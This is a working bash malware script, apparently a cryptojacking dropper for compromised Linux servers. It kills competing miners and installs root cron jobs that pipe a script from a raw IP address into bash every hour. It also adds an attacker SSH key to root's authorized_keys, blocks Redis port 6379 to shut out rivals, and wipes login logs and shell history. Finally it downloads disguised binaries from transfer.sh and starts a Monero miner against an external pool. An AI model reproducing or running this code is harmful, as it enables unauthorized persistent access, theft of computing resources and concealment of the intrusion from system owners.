#!/bin/bash
ps -ef | grep crypto-pool | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep nanopool | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep supportxmr | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep minexmr | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep dwarfpool | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep xmrpool | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep moneropool | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep xmr | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep monero | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep udevs | grep -v grep | awk '{print $2}' | xargs kill -9
rm -rf /var/lib/apt/lists/*
apt-get update
apt-get install wget -y
apt-get install libcurl4-openssl-dev -y
apt-get install python-pip -y
apt-get install ca-certificates -y
apt-get install redis-tools -y
apt-get install python gcc -y
apt-get install python-setuptools python-dev build-essential -y --allow-unauthenticated
yum -y install epel-release
yum -y install wget gcc redis git python-pip ca-certificates
echo "0 * * * * curl -fsSL http://185.10.68.202:5050/mrx1 | bash" > /var/spool/cron/root
echo "0 * * * * wget -q -O- http://185.10.68.202:5050/mrx1 | bash" >> /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
mkdir -p /root/.ssh/
echo "0 * * * * curl -fsSL http://185.10.68.202:5050/mrx1 | bash" > /var/spool/cron/crontabs/root
echo "0 * * * * wget -q -O- http://185.10.68.202:5050/mrx1 | bash" >> /var/spool/cron/crontabs/root
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV1VxPVZFUOOWZwMFVBwP/904lhAZNj2U5DPsZyIWw33jHeFRElM++XnUYmkMDiu8KuJXnFDJMkyXxsq77fOpDhVGOoexll3+P6SmZWViWwnhOgvxhccgT72J+LPZEIwPqPZQVHR4ksdVSnMVreyZs+rQ7O+L2xychpqzeIrk4Q/08f5XreOnq4Rgxp9oKwSlf7vKmQ7tUWUxfMHHL1wQYZPmdKpgSi/JmokLpp5cKAT7r0gGOj1jV8ZAJc+z45Ts2JBH9JYscHBssh7MBWWymcjXANd9a6XaQnbnl6nOFFNyYm8dBuLkGpEUNCdMq/jc5YLfnAnbGVbBMhuWzaWUp root@host-10-10-10-26" >> /root/.ssh/authorized_keys
PS3=$(iptables -L | grep 6379 | wc -l)
if [ $PS3 -eq 0 ];
then
yum -y install iptables-services
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
service iptables save
/etc/init.d/iptables-persistent save
fi
echo "" > /var/log/wtmp
echo "" > /var/log/secure
history -c
if [ ! -f "/tmp/kworkers" ];then
wget https://transfer.sh/oyIYQ/clay  --no-check-certificate -O /tmp/clay && chmod +x /tmp/clay
wget https://transfer.sh/mSEiP/nodexx --no-check-certificate -O /tmp/kworkers && chmod 777 /tmp/kworkers
curl -sk https://transfer.sh/mSEiP/nodexx -o /tmp/kworkers && chmod 777 /tmp/kworkers
fi
cd /tmp
PS1=$(ps aux | grep clay | grep -v "grep" | wc -l)
if [ $PS1 -eq 0 ];
then
    /tmp/clay &
fi
PS2=$(ps aux | grep kworkers | grep -v "grep" | wc -l)
if [ $PS2 -eq 0 ];
then
    /tmp/kworkers -a cryptonight -o stratum+tcp://pool.zer0day.ru:8080 -u LinuxServer -p LinuxServer  --safe -B
fi
if [[ $? -ne 0 && $PS2 -eq 0 ]];
then
wget https://transfer.sh/13qqfS/glibc-2.14.tar.gz --no-check-certificate -O /tmp/glibc-2.14.tar.gz && tar zxvf /tmp/glibc-2.14.tar.gz -C / && export LD_LIBRARY_PATH=/opt/glibc-2.14/lib:$LD_LIBRARY_PATH && /tmp/kworkers -a cryptonight -o stratum+tcp://pool.zer0day.ru:8080 -u LinuxServer -p LinuxServer  --safe -B && echo "" > /var/log/wtmp && echo "" > /var/log/secure && history -c 
fi
if [ $PS3 -eq 0 ];
then
yum -y install iptables-services
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
service iptables save
/etc/init.d/iptables-persistent save
fi
